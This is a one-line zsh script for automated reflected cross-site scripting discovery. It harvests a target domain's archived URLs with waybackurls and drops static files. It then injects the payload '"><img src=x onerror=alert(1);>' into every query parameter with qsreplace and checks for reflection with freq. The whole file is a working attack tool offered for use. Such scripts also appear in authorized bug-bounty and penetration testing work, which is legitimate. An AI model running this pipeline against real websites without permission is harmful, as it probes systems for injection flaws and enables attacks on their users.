#! /usr/bin/zsh

echo $1 | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
